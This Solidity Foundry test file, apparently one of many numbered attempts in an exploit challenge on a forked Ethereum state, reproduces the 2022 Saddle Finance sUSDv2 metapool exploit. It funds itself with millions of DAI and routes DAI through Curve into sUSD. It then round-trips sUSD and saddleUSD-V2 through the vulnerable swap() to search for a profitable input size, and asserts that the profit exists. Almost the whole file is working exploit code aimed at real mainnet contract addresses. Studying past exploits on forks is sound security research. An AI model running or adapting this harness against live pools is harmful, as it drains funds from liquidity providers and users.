// SPDX-License-Identifier: MIT
pragma solidity 0.8.23;

import "forge-std/Test.sol";

interface IERC20Attempt51 {
    function approve(address spender, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
}

interface ICurveSUSDPoolAttempt51 {
    function exchange_underlying(int128 i, int128 j, uint256 dx, uint256 minDy) external;
}

interface IMetaSwapAttempt51 {
    function paused() external view returns (bool);
    function getTokenBalance(uint8 index) external view returns (uint256);
    function getVirtualPrice() external view returns (uint256);
    function swap(uint8 i, uint8 j, uint256 dx, uint256 minDy, uint256 deadline) external;
}

/// @notice Hypothesis: despite the April 30, 2022 Saddle exploit already having drained most of the
/// sUSDv2 metapool, the remaining reserves on the challenge fork may still allow a profitable
/// `sUSD -> saddleUSD-V2 -> sUSD` round-trip through the same vulnerable `swap()` path.
contract Attempt51 is Test {
    struct RoundTripResult {
        bool buyOk;
        bool sellOk;
        uint256 susdFromCurve;
        uint256 saddleOut;
        uint256 susdBack;
        uint256 daiBack;
        int256 profit;
        string buyReason;
        string sellReason;
    }

    uint256 internal constant FORK_BLOCK = 14_684_686;
    uint256 internal constant EXPECTED_CHAIN_ID = 2401;

    address internal constant DAI = 0x6B175474E89094C44Da98b954EedeAC495271d0F;
    address internal constant SUSD = 0x57Ab1ec28D129707052df4dF418D58a2D46d5f51;
    address internal constant SADDLE_USD_V2 = 0x5f86558387293b6009d7896A61fcc86C17808D62;
    ICurveSUSDPoolAttempt51 internal constant CURVE_SUSD_POOL =
        ICurveSUSDPoolAttempt51(0xA5407eAE9Ba41422680e2e00537571bcC53efBfD);
    IMetaSwapAttempt51 internal constant SUSD_V2_METAPOOL =
        IMetaSwapAttempt51(0x824dcD7b044D60df2e89B1bB888e66D8BCf41491);

    IERC20Attempt51 internal constant DAI_TOKEN = IERC20Attempt51(DAI);
    IERC20Attempt51 internal constant SUSD_TOKEN = IERC20Attempt51(SUSD);
    IERC20Attempt51 internal constant SADDLE_USD_V2_TOKEN = IERC20Attempt51(SADDLE_USD_V2);

    function setUp() public {
        vm.createSelectFork("ch3", FORK_BLOCK);

        vm.label(DAI, "DAI");
        vm.label(SUSD, "sUSD");
        vm.label(SADDLE_USD_V2, "saddleUSD-V2");
        vm.label(address(CURVE_SUSD_POOL), "Curve_sUSD_Pool");
        vm.label(address(SUSD_V2_METAPOOL), "Saddle_sUSDv2_MetaPool");
    }

    function test_saddle_roundtrip_search_current_state() public {
        assertEq(block.chainid, EXPECTED_CHAIN_ID, "unexpected challenge chain id");

        console.log("CHAIN_ID:", block.chainid);
        console.log("FORK_BLOCK:", block.number);
        console.log("METAPOOL_PAUSED:", SUSD_V2_METAPOOL.paused());
        console.log("METAPOOL_SUSD_BALANCE:", SUSD_V2_METAPOOL.getTokenBalance(0));
        console.log("METAPOOL_SADDLE_USD_V2_BALANCE:", SUSD_V2_METAPOOL.getTokenBalance(1));
        console.log("METAPOOL_VIRTUAL_PRICE:", SUSD_V2_METAPOOL.getVirtualPrice());

        uint256[] memory candidates = new uint256[](14);
        candidates[0] = 100_000e18;
        candidates[1] = 250_000e18;
        candidates[2] = 500_000e18;
        candidates[3] = 750_000e18;
        candidates[4] = 1_000_000e18;
        candidates[5] = 1_500_000e18;
        candidates[6] = 2_000_000e18;
        candidates[7] = 3_000_000e18;
        candidates[8] = 5_000_000e18;
        candidates[9] = 7_500_000e18;
        candidates[10] = 10_000_000e18;
        candidates[11] = 12_500_000e18;
        candidates[12] = 14_800_272e18;
        candidates[13] = 15_000_000e18;

        int256 bestProfit = type(int256).min;
        uint256 bestInput;
        uint256 bestSUsdFromCurve;
        uint256 bestSaddleOut;
        uint256 bestSUsdBack;
        uint256 bestDaiBack;

        for (uint256 i = 0; i < candidates.length; ++i) {
            uint256 snapshotId = vm.snapshotState();

            deal(DAI, address(this), candidates[i]);
            require(DAI_TOKEN.approve(address(CURVE_SUSD_POOL), type(uint256).max), "approve DAI failed");
            require(SUSD_TOKEN.approve(address(SUSD_V2_METAPOOL), type(uint256).max), "approve sUSD failed");
            require(SUSD_TOKEN.approve(address(CURVE_SUSD_POOL), type(uint256).max), "approve sUSD curve failed");
            require(
                SADDLE_USD_V2_TOKEN.approve(address(SUSD_V2_METAPOOL), type(uint256).max), "approve saddleUSD failed"
            );

            console.log("TRY_INPUT_DAI:", candidates[i]);
            RoundTripResult memory result = _runCandidate(candidates[i]);

            console.log("CURVE_SUSD_FROM_DAI:", result.susdFromCurve);

            if (!result.buyOk) {
                console.log("ROUNDTRIP_BUY_OK:", result.buyOk);
                console.log("ROUNDTRIP_BUY_REVERT:", result.buyReason);
                vm.revertToState(snapshotId);
                continue;
            }

            if (!result.sellOk) {
                console.log("ROUNDTRIP_SELL_OK:", result.sellOk);
                console.log("ROUNDTRIP_SELL_REVERT:", result.sellReason);
                vm.revertToState(snapshotId);
                continue;
            }

            console.log("ROUNDTRIP_SADDLE_OUT:", result.saddleOut);
            console.log("ROUNDTRIP_SUSD_BACK:", result.susdBack);
            console.log("CURVE_DAI_BACK:", result.daiBack);
            console.log("ROUNDTRIP_PROFIT_DAI_SIGNED:", result.profit);

            if (result.profit > bestProfit) {
                bestProfit = result.profit;
                bestInput = candidates[i];
                bestSUsdFromCurve = result.susdFromCurve;
                bestSaddleOut = result.saddleOut;
                bestSUsdBack = result.susdBack;
                bestDaiBack = result.daiBack;
            }

            vm.revertToState(snapshotId);
        }

        console.log("BEST_INPUT_DAI:", bestInput);
        console.log("BEST_SUSD_FROM_CURVE:", bestSUsdFromCurve);
        console.log("BEST_SADDLE_OUT:", bestSaddleOut);
        console.log("BEST_SUSD_BACK:", bestSUsdBack);
        console.log("BEST_DAI_BACK:", bestDaiBack);
        console.log("BEST_PROFIT_DAI_SIGNED:", bestProfit);

        assertGt(bestProfit, 0, "current sUSDv2 state no longer yields a profitable DAI round-trip");
    }

    function _trySwap(uint8 i, uint8 j, uint256 dx) internal returns (bool ok, uint256 amountOut, string memory reason) {
        IERC20Attempt51 outputToken = j == 0 ? SUSD_TOKEN : SADDLE_USD_V2_TOKEN;
        uint256 balanceBefore = outputToken.balanceOf(address(this));
        bytes memory returnData;
        (ok, returnData) = address(SUSD_V2_METAPOOL).call(
            abi.encodeCall(IMetaSwapAttempt51.swap, (i, j, dx, 0, block.timestamp + 1))
        );

        if (ok) {
            amountOut = outputToken.balanceOf(address(this)) - balanceBefore;
            return (ok, amountOut, "");
        }

        reason = _decodeRevertReason(returnData);
    }

    function _runCandidate(uint256 inputDai) internal returns (RoundTripResult memory result) {
        uint256 susdBefore = SUSD_TOKEN.balanceOf(address(this));
        CURVE_SUSD_POOL.exchange_underlying(0, 3, inputDai, 0);
        result.susdFromCurve = SUSD_TOKEN.balanceOf(address(this)) - susdBefore;
        console.log("TRACE_BEFORE_BUY_SWAP_SUSD:", result.susdFromCurve);
        (result.buyOk, result.saddleOut, result.buyReason) = _trySwap(0, 1, result.susdFromCurve);
        console.log("TRACE_AFTER_BUY_SWAP_OK:", result.buyOk);
        if (!result.buyOk) {
            return result;
        }

        (result.sellOk, result.susdBack, result.sellReason) = _trySwap(1, 0, result.saddleOut);
        console.log("TRACE_AFTER_SELL_SWAP_OK:", result.sellOk);
        if (!result.sellOk) {
            return result;
        }

        uint256 daiBefore = DAI_TOKEN.balanceOf(address(this));
        CURVE_SUSD_POOL.exchange_underlying(3, 0, result.susdBack, 0);
        result.daiBack = DAI_TOKEN.balanceOf(address(this)) - daiBefore;
        result.profit = int256(result.daiBack) - int256(inputDai);
    }

    function _decodeRevertReason(bytes memory revertData) internal pure returns (string memory) {
        if (revertData.length < 68) {
            return "raw revert";
        }

        bytes4 selector;
        assembly {
            selector := mload(add(revertData, 0x20))
        }
        if (selector != 0x08c379a0) {
            return "non-string revert";
        }

        assembly {
            revertData := add(revertData, 0x04)
        }

        return abi.decode(revertData, (string));
    }
}
